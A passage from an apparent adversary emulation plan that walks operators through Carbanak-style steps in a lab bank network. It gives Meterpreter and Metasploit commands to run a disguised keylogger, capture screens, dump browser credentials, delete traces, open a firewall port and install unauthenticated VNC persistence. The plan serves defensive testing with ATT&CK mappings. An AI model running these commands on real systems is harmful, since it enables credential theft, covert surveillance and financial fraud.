- Carbanak has used plink and other malware to create reverse SSH tunnels.<sup>[11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate), [10](https://go.rsa.com/l/797543/2019-10-11/35g2/797543/11231/The_Shadows_Of_Ghosts_Carbanak_Report.pdf)</sup>
- Carbanak has used remote desktop to access internal hosts.<sup>[1](https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf)</sup>
- Carbanak has used Registry Run keys to establish persistence.<sup>[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/)</sup>

---

## Step 8 - Gain Covert Access to Target

After setting up the registry persistence, the attacker waits for the persistence to be executed. This occurs when the CFO user logs on to their workstation ([T1547.001](https://attack.mitre.org/techniques/T1547/001/)), resulting in a new HTTPS reverse shell within the CFO user's context (T[1071.001](https://attack.mitre.org/techniques/T1071/001/)).

### Procedures

#### 8.A - Execute Registry Persistence on CFO ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))

1. Reboot CFO
    ```
    Right click Windows icon > Shut Down or Sign Out > Restart > Continue
    ```

2. Close the BankDC RDP Session

3. Punt Meterpreter Sessions

    1. Switch to the `Attack Platform` terminal

        `[ $ ]>`

    2. Exit shells within Meterpreter session
        Pay attention to your terminal prompt:

        ```
        $ exit
        ```
        
        ```
        C:\windows\system32> exit
        ```
    
    3. Background Meterpreter session    
        ```
        meterpreter > background
        ```

    4. Kill meterpreter sessions

        ```
        msf > sessions -K
        ```

4. RDP into CFO as `<cfo_user>`
    
    Note that during this step the "real" CFO is logging in.

    **This is not "red team activity".**
    ```
    xfreerdp +clipboard /u:"<cfo_user>@<domain_full>" /p:"<cfo_user_password>" /v:<cfo_ip>
    ```

5. Switch back to your `Attack Platform` terminal
    
    You should receive a new Meterpreter callback within a minute or two.

### Cited Intelligence
- Carbanak has used wscript to execute various commands.<sup>[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/)</sup>

---

## Step 9 - Profile a Victim User

Using the reverse shell within the CFO user's context, the attacker collects information needed to wire money to illicit accounts. The attacker performs keylogging ([T1056.001](https://attack.mitre.org/techniques/T1056/001/)) and screen capturing ([T1113](https://attack.mitre.org/techniques/T1113/)) to monitor the CFO user's behavior, after which they steal the user's credentials from their web browser ([T1555.003](https://attack.mitre.org/techniques/T1555/003/)). Lastly, the attacker cleans up artifacts they produced on the CFO workstation ([T1070.004](https://attack.mitre.org/techniques/T1070/004/)).

### Procedures

#### 9.A - User Monitoring - ([T1056.001](https://attack.mitre.org/techniques/T1056/001/), [T1113](https://attack.mitre.org/techniques/T1113/))

1. Interact with Meterpreter session
    ```
    msf > sessions -i 3
    ```

2. Get Meterpreter PID
    ```
    meterpreter > getpid
    ```

    If your shell seems to be missing basic commands, wait 2 minutes and try again. Sometimes Meterpreter just needs additional time to load its standard API.

3. Upload `keylogger.exe` to `cfo` as `DefenderUpgradeExec.exe`
     ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step9/keylogger.exe "C:\\Users\\<cfo_user>\\AppData\\Local\Temp\\DefenderUpgradeExec.exe"
    ```
   
4. Execute `keylogger.exe`
    ```
    meterpreter > execute -f C:\\Users\\<cfo_user>\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe
    ```

5. Background Meterpreter prompt
    ```
    meterpreter > background
    ```
   
    Your prompt should now show:
    
    ```msf >```

6. Begin capturing the `CFO`'s screen using Metasploit's `screen_spy` module
    ```
    use post/windows/gather/screen_spy
    set COUNT 60
    set DELAY 1
    set VIEW_SCREENSHOTS false
    set SESSION 3
    exploit
    ```
   
    The Meterpreter process will migrate to a new process before beginning the screen capture.
    Wait for the screen capture to start before continuing to the next step.

7. Role play as CFO

    Switch to CFO RDP Session; you're now role playing as the CFO.
    ```
    1. Open Edge; type "finance.yahoo.com" in the URL bar so that the keylogger can grab it
    
    2. Open Payment Transfer System (icon is on the desktop; double click it)
    
    3. Pretend to send money; delete 'widgets inc' and replace with 'AccountingIQ'
    
    Note that the payment software does absolutely nothing; no data is sent, no packets, etc.
    It exists as a prop so that the attacker can learn how to transfer money to an illicit account.
    ```

    Switch back to the `Attack Platform` after 60 seconds. It will seem like a long time, just be patient

8. Ensure module worked
    
    If you see a wall of "screenshot text", you know it worked
    ```
    msf > loot
    ```

9. Switch back to Meterpreter session
    ```
    msf > sessions -i 3
    ```

10. Read keylogger dump
    ```
    meterpreter > cat C:\\Users\\<cfo_user>\\AppData\\Local\\Temp\\klog2.txt
    ```
   
11. Stop the keylogger process
    ```
    meterpreter > execute -f powershell.exe -i -H -a "-c Stop-Process -Name DefenderUpgradeExec"
    ```

#### 9.B - Credentials from Web Browsers ([T1070.004](https://attack.mitre.org/techniques/T1070/004/))

1. Upload `dumpWebCreds.exe` to `cfo` as `infosMin48.exe`
    ```
    meterpreter > upload /home/<attacker>/carbanak/Resources/step9/dumpWebCreds.exe C:\\Users\\<cfo_user>\\AppData\\Local\\Temp\\infosMin48.exe
    ```
   
2. Execute `infosMin48.exe`
    ```
    meterpreter > execute -f C:\\Users\\<cfo_user>\\AppData\\Local\\Temp\\infosMin48.exe -i -H
    ```

2. Delete dropped files
    ```
    meterpreter > execute -f powershell.exe -i -H -a "-c Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'"
    ```

### Cited Intelligence
- Carbanak is known to deploy software that can monitor a user's keystrokes as well as capturing video recordings of bank employees.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)</sup>
- Carbank malware can inject payloads into processes.<sup>[7](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)</sup>
- Carbanak has tools that are built for collecting credentials from browsers and applications.<sup>[11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate), [10](https://go.rsa.com/l/797543/2019-10-11/35g2/797543/11231/The_Shadows_Of_Ghosts_Carbanak_Report.pdf)</sup>

---

## Step 10 - Impersonate Victim

Having all the information needed to transfer money as the CFO user, all the attacker needs now is the ability to directly interact with the Payment Transfer System as the CFO. To do this, the attacker sets up VNC persistence to gain desktop access. They upload a **Tight VNC** installer along with a registry key file used to configure VNC settings ([T1105](https://attack.mitre.org/techniques/T1105/)). They then make a firewall rule to allow inbound connections to the VNC server ([T1562.004](https://attack.mitre.org/techniques/T1562/004/)), and finally install VNC ([T1543.003](https://attack.mitre.org/techniques/T1543/003/)) before deleting their previously used registry persistence ([T1112](https://attack.mitre.org/techniques/T1112/)).

With these steps completed, the attacker is able to log in to the CFO workstation using the CFO user's credentials ([T1078](https://attack.mitre.org/techniques/T1078/)) through a VNC client ([T1021.005](https://attack.mitre.org/techniques/T1021/005/)) and complete their objective.

### Procedures

#### 10.A - Install VNC Persistence ([T1543.003](https://attack.mitre.org/techniques/T1543/003/), [T1021.005](https://attack.mitre.org/techniques/T1021/005/))

1. Upload Tight VNC installer `cfo`
    ```
    meterpreter > upload /home/gfawkes/carbanak/Resources/step10/tightvnc-2.8.27-gpl-setup-64bit.msi C:\\Users\\Public\\
    ```
   
2. Upload VNC settings registry file
    ```
    meterpreter > upload /home/gfawkes/carbanak/Resources/step10/vnc-settings.reg C:\\Users\\Public\\
    ```

3. Background session
    ```
    meterpreter > background
    ```
   
    Your prompt should now show:
    
    ```msf >```

4. Make firewall rule to allow TightVNC Server using Metasploit's `run_as` module
    ```
    use post/windows/manage/run_as
    set CMD "netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900"
    set DOMAIN <domain_full>
    set PASSWORD <domain_admin_password>
    set USER <domain_admin>
    set SESSION 3
    exploit
    ```

5. Install VNC using Metasploit's `run_as` module
    ```
    set CMD "C:\Users\Public\tightvnc-2.8.27-gpl-setup-64bit.msi /quiet"
    exploit
    ```

6. Disable VNC authentication and prompts using Metasploit's `run_as` module
    ```
    set CMD "reg.exe IMPORT C:\Users\Public\vnc-settings.reg"
    exploit
    ```

6. Delete Registry Persistence using Metasploit's `run_as` module
    ```
    set CMD "reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f"
    exploit
    ```

7. Punt the Meterpreter session, we don't need it anymore
    ```
    msf > sessions -K
    ```

8. Reboot CFO

    Note: This is NOT in scope for the evaluation!

    Switch to the CFO RDP session, open cmd.exe and paste the following.
    ```
    CFO CMD> runas /user:<domain_admin>@<domain_full> "powershell.exe -c Restart-Computer -Force"
    ```

    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

#### 10.B - Use VNC Persistence ([T1021.005](https://attack.mitre.org/techniques/T1021/005/))

On your Ubuntu machine:

1. Setup an SSH tunnel to forward VNC through the `Attack Platform`
    ```
    ssh <attacker>@192.168.0.4 -L 12345:<cfo_ip>:5900
    ```
   
   Provide the `<attacker>` password when prompted.

2. Open a VNC client

3. Set the target to `127.0.0.1:12345` and connect

Within the VNC session:

1. Enter the CFO user's credentials
    ```
    Username:       <cfo_user>
    Password:       <cfo_user_password>
    ```
    
2. Open Payment Transfer System 

3. Pretend to transfer money to a hostile account
    ```
    Enter 'Carbanak' in the to-field
    ```

### Cited Intelligence
- Carbanak malware includes a VNC module for taking control of a victim's desktop and establishing persistence.<sup>[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/), [3](https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/)</sup>
- Carbanak has installed Ammyy Admin remote desktop control software.<sup>[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/), [14](https://www.group-ib.com/resources/threat-research/Anunak_APT_against_financial_institutions.pdf), [6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf), [3](https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/)</sup>
- Carbanak malware can use netsh to add firewall exclusions.<sup>[14](https://www.group-ib.com/resources/threat-research/Anunak_APT_against_financial_institutions.pdf)</sup>

---

- [Intelligence Summary](/Intelligence_Summary.md)
- [Operations Flow](/Operations_Flow.md)
- [Emulation Plan](/Emulation_Plan)
  - [Scenario 1 - Infrastructure](/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1 - Detections](/Emulation_Plan/Scenario_1)
  - [Scenario 2 - Infrastructure](/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2 - Protections](/Emulation_Plan/Scenario_2)
  - [YAML](/Emulation_Plan/yaml)
- [File Hashes](/hashes)
- [YARA Rules](/yara-rules)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/CHANGE_LOG.md)
